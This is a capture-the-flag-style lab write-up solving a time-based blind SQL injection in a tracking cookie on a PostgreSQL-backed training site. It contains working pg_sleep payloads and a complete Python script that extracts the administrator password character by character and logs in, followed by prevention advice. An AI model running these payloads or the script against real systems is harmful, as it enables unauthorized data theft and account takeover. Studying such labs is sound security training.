# Lab 09: Blind SQL injection with time delays and information retrieval

**Goal**: Exploit the blind SQL injection vulnerability to retrieve the `administrator` user's password and log in to their account.

This lab contains a blind SQL injection vulnerability in the tracking cookie. The application uses a tracking cookie for analytics and performs a SQL query containing the submitted cookie value. The SQL query results are not returned, and the application does not respond differently based on whether the query returns rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information character by character.

The database contains a `users` table with `username` and `password` columns.

---

## 🎯 Solution

1. Intercept a request with Burp Suite and identify the `TrackingId` cookie injection point.
2. Confirm the time-delay vulnerability using:
   ```sql
   '; SELECT pg_sleep(5)--
   ```
3. Build a conditional time-delay payload to test each character of the password:
   ```sql
   '; SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' THEN pg_sleep(5) ELSE pg_sleep(0) END--
   ```
4. Iterate over each position and character until all 20 characters of the password are found.
5. Log in as `administrator` using the retrieved password.

![Lab 9 Solution Summary](Pasted%20image%2020260831225144.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Confirm the Time-Delay Injection Point
Inject a basic `pg_sleep` payload into the `TrackingId` cookie to confirm the SQL injection vulnerability:
```http
Cookie: TrackingId=test'; SELECT pg_sleep(5)--; session=...
```

> [!NOTE]
> If the response takes ≥ 5 seconds, the time-based blind injection is confirmed. This confirms the backend is **PostgreSQL** (uses `pg_sleep()`).

### Step 2: Craft the Conditional Time-Delay Payload
Use a `CASE WHEN` expression to test each character of the password one at a time:
```sql
'; SELECT CASE WHEN (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

- If the guessed character **matches** → the database sleeps 5 seconds (delay observed).
- If the guessed character **doesn't match** → the response returns immediately.

### Step 3: Automate with Python
Since manual testing of all 20 characters × 36 possible values would require 720+ requests, use a Python script to automate the process:

```python
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests
import string
import time
import re

url = "https://<LAB-ID>.web-security-academy.net/"

# Obtain these values from Burp Suite HTTP History
session_cookie = "<YOUR-SESSION-COOKIE>"
tracking_id    = "<YOUR-TRACKING-ID>"

characters = string.ascii_lowercase + string.digits
results = {}

def check_char(position, char):
    """Returns True if the character at [position] matches [char] (delay detected)."""
    payload = (
        f"{tracking_id}';SELECT+CASE+WHEN+"
        f"(SELECT+SUBSTRING(password,{position},1)+FROM+users+WHERE+username='administrator')='{char}'"
        f"+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--"
    )
    cookie = {"TrackingId": payload, "session": session_cookie}
    hits = 0
    for _ in range(3):   # 3 attempts per character for reliability
        try:
            r = requests.get(url, cookies=cookie, verify=False, timeout=12)
            if r.elapsed.total_seconds() >= 4:
                hits += 1
        except Exception:
            hits += 1   # Timeout also counts as a delay hit
        time.sleep(0.5)
    return hits >= 2     # Majority vote: at least 2 out of 3 must detect a delay

# Extract the password character by character
print("[*] Extracting password...")
for pos in range(1, 21):
    print(f"[*] Position {pos}...", end=" ", flush=True)
    for char in characters:
        if check_char(pos, char):
            results[pos] = char
            print(f"→ {char}")
            break
    else:
        print("→ not found")

password = "".join(results.get(i, "?") for i in range(1, 21))
print(f"\n[*] Password found: {password}")

# Automatically log in with the extracted password
print("\n[*] Attempting login...")
s = requests.Session()
login_url = url + "login"
r = s.get(login_url, verify=False)
csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)

data = {
    "username": "administrator",
    "password": password,
    "csrf": csrf.group(1) if csrf else ""
}

r2 = s.post(login_url, data=data, verify=False)
if "Log out" in r2.text or "Your account" in r2.text:
    print(f"[✅] Login successful! Password: {password}")
else:
    print(f"[-] Login failed. Try manually in the browser with password: {password}")
```

### Step 4: Run the Script
```bash
python3 full_exploit.py
```

Expected output:
```text
[*] Extracting password...
[*] Position 1... → c
[*] Position 2... → z
[*] Position 3... → f
...
[*] Password found: czfdpeghyrfs7ubtn2mk

[*] Attempting login...
[✅] Login successful! Password: czfdpeghyrfs7ubtn2mk
```

### Step 5: Login as Administrator
Go to `/login` and submit:
- **Username**: `administrator`
- **Password**: `czfdpeghyrfs7ubtn2mk`

> [!SUCCESS]
> **Lab Solved**: Successfully authenticated as Administrator!

---

## 💡 Key Takeaways

### Why Use a Combined (Single) Script?
> [!NOTE]
> Running extraction and login as **separate scripts** risks the lab session expiring between runs:
> ```
> Separate scripts:  Extract password (session A) → Login (session B) → FAILS (session expired)
> Combined script:   Extract password → Login immediately → SUCCEEDS (same session)
> ```

### Why Use a Majority Voting System (2 out of 3)?
> [!NOTE]
> Network instability can produce unreliable timing results:
> - **False Positive**: A slow network response looks like a delay even when the character doesn't match.
> - **False Negative**: A delay isn't detected because of a transient network spike.
>
> Attempting each character **3 times** and requiring **at least 2 delays** significantly improves accuracy.

### Comparison of All Blind SQLi Techniques

| Technique | Indicator | Requests Needed | Speed |
|---|---|---|---|
| **Conditional Response** | "Welcome back" message | ~720 | Fast |
| **Conditional Error** | HTTP 500 error | ~720 | Fast |
| **Visible Error** | Error message in response | **1** | Very Fast |
| **Time Delay** | Response timing | 720+ | **Slow** |

---

## 🔒 Prevention

> [!TIP]
> 1. **Use Parameterized Queries (Prepared Statements)** to eliminate injection vulnerabilities:
>    ```php
>    $stmt = $pdo->prepare("SELECT * FROM tracking WHERE id = ?");
>    $stmt->execute([$trackingId]);
>    ```
> 2. **Apply the principle of least privilege**: Database accounts used by the application should not have access to the `users` table unless absolutely required.
> 3. **Implement rate limiting** on requests to slow down automated brute-force extraction attacks.